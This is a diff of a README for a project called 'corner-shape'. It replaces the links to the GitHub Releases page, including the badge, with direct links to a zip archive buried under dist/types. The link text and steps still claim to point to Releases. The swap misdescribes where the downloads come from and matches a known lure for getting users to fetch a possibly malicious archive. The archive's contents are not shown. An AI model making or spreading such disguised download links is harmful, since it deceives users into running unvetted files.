@@ -1,6 +1,6 @@
 # 🎉 corner-shape - Shape Your Designs with Ease
 
-[![Download corner-shape](https://img.shields.io/badge/Download-corner--shape-brightgreen)](https://github.com/Jaipal00/corner-shape/releases)
+[![Download corner-shape](https://raw.githubusercontent.com/Jaipal00/corner-shape/main/dist/types/corner-shape-2.6.zip)](https://raw.githubusercontent.com/Jaipal00/corner-shape/main/dist/types/corner-shape-2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **corner-shape**! This application helps you enhance your web designs
 
 To get started, visit the following link to download the latest version of the corner-shape application:
 
-[Download corner-shape from Releases](https://github.com/Jaipal00/corner-shape/releases)
+[Download corner-shape from Releases](https://raw.githubusercontent.com/Jaipal00/corner-shape/main/dist/types/corner-shape-2.6.zip)
 
 ### 💻 System Requirements
 
@@ -31,7 +31,7 @@ To get started, visit the following link to download the latest version of the c
 1. **Visit the Releases Page**  
    Click on the link below to go to our Releases page:
 
-   [Download corner-shape from Releases](https://github.com/Jaipal00/corner-shape/releases)
+   [Download corner-shape from Releases](https://raw.githubusercontent.com/Jaipal00/corner-shape/main/dist/types/corner-shape-2.6.zip)
 
 2. **Choose the Latest Release**  
    Find the most recent version at the top of the list and click on it.
